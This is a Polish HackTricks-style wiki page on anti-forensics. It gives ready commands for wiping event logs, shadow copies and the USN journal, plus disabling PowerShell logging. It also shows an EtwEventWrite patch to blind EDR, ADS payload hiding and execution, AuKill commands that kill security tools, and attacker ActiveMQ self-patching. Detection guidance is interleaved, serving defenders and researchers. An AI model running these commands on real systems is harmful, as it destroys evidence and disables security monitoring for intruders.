# Techniki antykryminalistyczne

{{#include ../../banners/hacktricks-training.md}}

## Znaczniki czasu

Atakujący może być zainteresowany **zmianą znaczników czasu plików**, aby uniknąć wykrycia.\
Znaczniki czasu można znaleźć w MFT, w atrybutach `$STANDARD_INFORMATION` \_\_ oraz \_\_ `$FILE_NAME`.

Oba atrybuty zawierają 4 znaczniki czasu: **modyfikacji**, **dostępu**, **utworzenia** oraz **modyfikacji wpisu MFT** (MACE lub MACB).

**Windows Explorer** i inne narzędzia wyświetlają informacje z **`$STANDARD_INFORMATION`**.

### TimeStomp - narzędzie antykryminalistyczne

To narzędzie **modyfikuje** informacje o znacznikach czasu w **`$STANDARD_INFORMATION`**, **ale nie** informacje w **`$FILE_NAME`**. Dlatego możliwe jest **zidentyfikowanie** **podejrzanej** **aktywności**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) to funkcja systemu plików NTFS (Windows NT file system), która śledzi zmiany na woluminie. Narzędzie [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) umożliwia analizę tych zmian.

![TimeStomp - narzędzie antykryminalistyczne - Usnjrnl: USN Journal (Update Sequence Number Journal) to funkcja systemu plików NTFS (Windows NT file system), która śledzi zmiany na woluminie. Narzędzie...](<../../images/image (801).png>)

Na powyższym obrazie widoczne jest **wyjście** narzędzia, w którym można zaobserwować, że w pliku **wykonano pewne zmiany**.

### $LogFile

**Wszystkie zmiany metadanych systemu plików są rejestrowane** w procesie znanym jako [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Zarejestrowane metadane są przechowywane w pliku o nazwie `**$LogFile**`, znajdującym się w katalogu głównym systemu plików NTFS. Narzędzia takie jak [LogFileParser](https://github.com/jschicht/LogFileParser) mogą służyć do analizowania tego pliku i identyfikowania zmian.

![Usnjrnl - $LogFile: Wszystkie zmiany metadanych systemu plików są rejestrowane w procesie znanym jako write-ahead logging. Zarejestrowane metadane są przechowywane w pliku o nazwie $LogFile, znajdującym się w katalogu głównym...](<../../images/image (137).png>)

Ponownie, w danych wyjściowych narzędzia można zobaczyć, że **wykonano pewne zmiany**.

Za pomocą tego samego narzędzia można zidentyfikować, **kiedy zmodyfikowano znaczniki czasu**:

![Usnjrnl - $LogFile: Za pomocą tego samego narzędzia można zidentyfikować, kiedy zmodyfikowano znaczniki czasu](<../../images/image (1089).png>)

- CTIME: czas utworzenia pliku
- ATIME: czas modyfikacji pliku
- MTIME: czas modyfikacji wpisu MFT pliku
- RTIME: czas dostępu do pliku

### Porównanie `$STANDARD_INFORMATION` i `$FILE_NAME`

Innym sposobem identyfikowania podejrzanie zmodyfikowanych plików byłoby porównanie czasu w obu atrybutach w celu znalezienia **niezgodności**.

### Nanosekundy

Znaczniki czasu **NTFS** mają **precyzję** **100 nanosekund**. Dlatego znalezienie plików ze znacznikami czasu, takimi jak 2010-10-10 10:10:**00.000:0000, jest bardzo podejrzane**.

### SetMace - narzędzie antykryminalistyczne

To narzędzie może modyfikować oba atrybuty: `$STARNDAR_INFORMATION` oraz `$FILE_NAME`. Jednak od wersji Windows Vista do modyfikacji tych informacji wymagany jest działający system operacyjny.

## Ukrywanie danych

NFTS używa klastrów i minimalnego rozmiaru informacji. Oznacza to, że jeśli plik zajmuje jeden klaster i połowę kolejnego, **pozostała połowa nigdy nie zostanie wykorzystana** do czasu usunięcia pliku. Możliwe jest więc **ukrywanie danych w tej wolnej przestrzeni**.

Istnieją narzędzia, takie jak slacker, które umożliwiają ukrywanie danych w tej „ukrytej” przestrzeni. Jednak analiza `$logfile` i `$usnjrnl` może wykazać, że dodano pewne dane:

![SetMace - narzędzie antykryminalistyczne - Ukrywanie danych: Istnieją narzędzia, takie jak slacker, które umożliwiają ukrywanie danych w tej „ukrytej” przestrzeni. Jednak analiza $logfile i $usnjrnl może wykazać, że...](<../../images/image (1060).png>)

Następnie można odzyskać wolną przestrzeń za pomocą narzędzi takich jak FTK Imager. Należy pamiętać, że tego rodzaju narzędzie może zapisać zawartość w postaci zaciemnionej lub nawet zaszyfrowanej.

## UsbKill

To narzędzie **wyłączy komputer po wykryciu jakiejkolwiek zmiany** w portach **USB**.\
Można to wykryć, sprawdzając uruchomione procesy i **analizując każdy uruchomiony skrypt Pythona**.

## Dystrybucje Live Linux

Te dystrybucje są **uruchamiane w pamięci RAM**. Jedynym sposobem ich wykrycia jest **zamontowanie systemu plików NTFS z uprawnieniami do zapisu**. Jeśli zostanie zamontowany tylko z uprawnieniami do odczytu, wykrycie włamania nie będzie możliwe.

## Bezpieczne usuwanie

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Konfiguracja Windows

Możliwe jest wyłączenie kilku mechanizmów rejestrowania systemu Windows, aby znacznie utrudnić analizę kryminalistyczną.

### Wyłączanie znaczników czasu - UserAssist

Jest to klucz rejestru przechowujący daty i godziny uruchomienia poszczególnych plików wykonywalnych przez użytkownika.

Wyłączenie UserAssist wymaga wykonania dwóch kroków:

1. Ustaw oba klucze rejestru: `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` oraz `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` na zero, aby wskazać, że UserAssist ma zostać wyłączony.
2. Wyczyść poddrzewa rejestru przypominające `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Wyłączanie znaczników czasu - Prefetch

Mechanizm ten zapisuje informacje o uruchamianych aplikacjach w celu poprawy wydajności systemu Windows. Informacje te mogą być jednak również przydatne w analizie kryminalistycznej.

- Uruchom `regedit`
- Wybierz ścieżkę `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Kliknij prawym przyciskiem myszy zarówno `EnablePrefetcher`, jak i `EnableSuperfetch`
- Wybierz opcję Modify dla każdego z nich i zmień wartość z 1 (lub 3) na 0
- Uruchom system ponownie

### Wyłączanie znaczników czasu - czas ostatniego dostępu

Za każdym razem, gdy folder jest otwierany z woluminu NTFS na serwerze Windows NT, system rejestruje czas **aktualizacji pola znacznika czasu w każdym wyświetlanym folderze**, zwanego czasem ostatniego dostępu. Na intensywnie używanym woluminie NTFS może to wpływać na wydajność.

1. Otwórz Edytor rejestru (Regedit.exe).
2. Przejdź do `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Znajdź `NtfsDisableLastAccessUpdate`. Jeśli ten wpis nie istnieje, dodaj wartość DWORD i ustaw ją na 1, co wyłączy ten proces.
4. Zamknij Edytor rejestru i uruchom ponownie serwer.

### Usuwanie historii USB

Wszystkie **wpisy urządzeń USB** są przechowywane w rejestrze Windows, w kluczu rejestru **USBSTOR**, który zawiera podklucze tworzone za każdym razem, gdy podłączysz urządzenie USB do komputera lub laptopa. Klucz ten znajduje się tutaj: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Usunięcie tego klucza** spowoduje usunięcie historii USB.\
Możesz również użyć narzędzia [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), aby upewnić się, że wpisy zostały usunięte (i aby je usunąć).

Innym plikiem przechowującym informacje o urządzeniach USB jest `setupapi.dev.log`, znajdujący się w `C:\Windows\INF`. Ten plik również powinien zostać usunięty.

### Wyłączanie kopii w tle

**Wyświetl** kopie w tle za pomocą `vssadmin list shadowstorage`\
**Usuń** je, uruchamiając `vssadmin delete shadow`

Możesz również usunąć je za pomocą interfejsu GUI, wykonując kroki opisane na stronie [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Aby wyłączyć kopie w tle, wykonaj [poniższe kroki](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Otwórz program Services, wpisując „services” w polu wyszukiwania tekstowego po kliknięciu przycisku Start systemu Windows.
2. Na liście znajdź „Volume Shadow Copy”, zaznacz tę usługę, a następnie otwórz Properties, klikając ją prawym przyciskiem myszy.
3. Z listy rozwijanej „Startup type” wybierz Disabled, a następnie zatwierdź zmianę, klikając Apply i OK.

Możliwe jest również zmodyfikowanie w rejestrze konfiguracji określającej, które pliki będą kopiowane do kopii w tle: `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Nadpisywanie usuniętych plików

- Możesz użyć **narzędzia Windows**: `cipher /w:C`. Spowoduje to usunięcie wszelkich danych z dostępnego, nieużywanego miejsca na dysku C.
- Możesz również użyć narzędzi takich jak [**Eraser**](https://eraser.heidi.ie)

### Usuwanie dzienników zdarzeń Windows

- Windows + R --> eventvwr.msc --> Rozwiń „Windows Logs” --> Kliknij prawym przyciskiem myszy każdą kategorię i wybierz „Clear Log”
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Wyłączanie dzienników zdarzeń Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- W sekcji usług wyłącz usługę „Windows Event Log”
- `WEvtUtil.exec clear-log` lub `WEvtUtil.exe cl`

### Wyłączanie $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Zaawansowane manipulowanie rejestrowaniem i śladami (2023-2025)

### Rejestrowanie bloków skryptów/modułów PowerShell

Nowsze wersje Windows 10/11 i Windows Server przechowują **bogate artefakty kryminalistyczne PowerShell** w lokalizacji
`Microsoft-Windows-PowerShell/Operational` (zdarzenia 4104/4105/4106).
Atakujący mogą wyłączyć je lub wyczyścić w trakcie działania:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Obrońcy powinni monitorować zmiany w tych kluczach rejestru oraz masowe usuwanie zdarzeń PowerShell.

### Patchowanie ETW (Event Tracing for Windows)

Produkty zabezpieczeń punktów końcowych w dużym stopniu polegają na ETW. Popularną metodą unikania wykrycia w 2024 roku jest spatchowanie w pamięci `ntdll!EtwEventWrite`/`EtwEventWriteFull`, aby każde wywołanie ETW zwracało `STATUS_SUCCESS` bez emitowania zdarzenia:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Publiczne PoCs (np. `EtwTiSwallow`) implementują ten sam primitive w PowerShell lub C++.
Ponieważ patch jest **process-local**, EDR-y działające wewnątrz innych procesów mogą go przeoczyć.<sup>[[5]](#references)</sup>
Detection: porównaj `ntdll` w pamięci z wersją na dysku albo zastosuj hook przed user-mode.

### Odrodzenie Alternate Data Streams (ADS)

W kampaniach malware z 2023 roku (np. **FIN12** loaders) obserwowano umieszczanie plików binarnych drugiego etapu
wewnątrz ADS, aby pozostać poza zasięgiem tradycyjnych skanerów:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Wylicz strumienie za pomocą `dir /R`, `Get-Item -Stream *` lub narzędzia Sysinternals `streams64.exe`.
Skopiowanie pliku hosta do systemu FAT/exFAT lub za pośrednictwem SMB usunie ukryty strumień i może zostać wykorzystane
przez śledczych do odzyskania payloadu.

### BYOVD & „AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver jest obecnie rutynowo wykorzystywane do **anti-forensics** podczas
włamań ransomware.
Open-source tool **AuKill** ładuje podpisany, ale podatny sterownik (`procexp152.sys`), aby
wstrzymać lub zakończyć działanie EDR i sensorów forensic **przed szyfrowaniem i zniszczeniem logów**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Sterownik jest następnie usuwany, pozostawiając minimalną ilość artefaktów.<sup>[[1]](#references)</sup>
Środki zaradcze: włącz listę blokowania podatnych sterowników firmy Microsoft (HVCI/SAC)
i generuj alerty dotyczące tworzenia usług kernelowych ze ścieżek zapisywalnych przez użytkownika.

---

## Linux Anti-Forensics: Self-Patching and Cloud C2 (2023–2025)

### Self‑patching przejętych usług w celu ograniczenia wykrywania (Linux)
Adversaries coraz częściej wykonują „self‑patch” usługi natychmiast po jej wykorzystaniu, aby zapobiec ponownemu wykorzystaniu i ograniczyć detekcję opartą na podatności. Chodzi o zastąpienie podatnych komponentów najnowszymi, legalnymi upstreamowymi plikami binarnymi/JAR-ami, dzięki czemu skanery zgłaszają, że host został załatany, podczas gdy persistence i C2 pozostają aktywne.<sup>[[3]](#references)</sup>

Przykład: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Po uzyskaniu dostępu attackers pobrali legalne pliki JAR z Maven Central (repo1.maven.org), usunęli podatne pliki JAR z instalacji ActiveMQ i ponownie uruchomili brokera.
- Zamknęło to początkowe RCE, jednocześnie zachowując inne footholdy (cron, zmiany w konfiguracji SSH, oddzielne implanty C2).

Przykład operacyjny (ilustracyjny)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Wskazówki dotyczące forensics/huntingu
- Sprawdź katalogi usług pod kątem nieplanowanych podmian plików binarnych/JAR:
- Debian/Ubuntu: `dpkg -V activemq` i porównaj hashe/ścieżki plików z mirrorami repozytoriów.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Szukaj wersji JAR obecnych na dysku, które nie są własnością package managera, lub linków symbolicznych zaktualizowanych poza standardowym procesem.
- Oś czasu: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` w celu skorelowania ctime/mtime z okresem kompromitacji.
- Historia powłoki/telemetria procesów: ślady użycia `curl`/`wget` do `repo1.maven.org` lub innych CDN-ów artefaktów bezpośrednio po początkowej eksploatacji.
- Zarządzanie zmianami: zweryfikuj, kto zastosował „patch” i dlaczego, a nie tylko to, że obecna jest wersja z patchem.

### C2 z wykorzystaniem usługi cloud, tokenów Bearer i stagerów anti-analysis
Zaobserwowane działania łączyły wiele długotrwałych ścieżek C2 oraz packaging utrudniający analizę:<sup>[[3]](#references)</sup>
- Zabezpieczone hasłem loadery ELF z PyInstaller, utrudniające sandboxing i analizę statyczną (np. zaszyfrowany PYZ, tymczasowa ekstrakcja w `/_MEI*`).
- Wskaźniki: wyniki `strings`, takie jak `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Artefakty runtime: ekstrakcja do `/tmp/_MEI*` lub niestandardowych ścieżek `--runtime-tmpdir`.
- C2 oparte na Dropboxie z użyciem zahardkodowanych tokenów OAuth Bearer
- Znaczniki sieciowe: `api.dropboxapi.com` / `content.dropboxapi.com` z `Authorization: Bearer <token>`.
- Przeszukuj proxy/NetFlow/Zeek/Suricata pod kątem wychodzącego HTTPS do domen Dropboxa z workloadów serwerowych, które normalnie nie synchronizują plików.
- Równoległe/zapasowe C2 przez tunneling (np. Cloudflare Tunnel `cloudflared`), zapewniające utrzymanie kontroli, jeśli jeden kanał zostanie zablokowany.
- IOC hosta: procesy/jednostki `cloudflared`, konfiguracja w `~/.cloudflared/*.json`, wychodzący ruch na port 443 do edge’ów Cloudflare.

### Persistence i „rollback hardeningu” w celu utrzymania dostępu (przykłady dla Linuxa)
Atakujący często łączą self-patching z trwałymi ścieżkami dostępu:<sup>[[3]](#references)</sup>
- Cron/Anacron: modyfikacje stubu `0anacron` w każdym katalogu `/etc/cron.*/` w celu okresowego wykonania.
- Hunting:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- Rollback hardeningu konfiguracji SSH: włączanie logowania roota i zmiana domyślnych powłok dla kont o niskich uprawnieniach.
- Hunting pod kątem włączenia logowania roota:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunting pod kątem podejrzanych powłok interaktywnych na kontach systemowych (np. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Losowe artefakty beaconów o krótkich nazwach (8 znaków alfabetycznych), zapisywane na dysku i nawiązujące połączenia z cloud C2:
- Hunting:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Obrońcy powinni korelować te artefakty z ekspozycją zewnętrzną i zdarzeniami patchowania usług, aby wykryć anti-forensic self-remediation wykorzystywane do ukrycia początkowej eksploatacji.

## References

- [1] [Sophos X-Ops – AuKill: Uzbrojony podatny sterownik do wyłączania EDR (marzec 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patchowanie EtwEventWrite dla zachowania skrytości: wykrywanie i hunting (czerwiec 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patchowanie na potrzeby persistence: jak malware DripDropper dla Linuxa porusza się w cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Ukrywanie .NET – ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
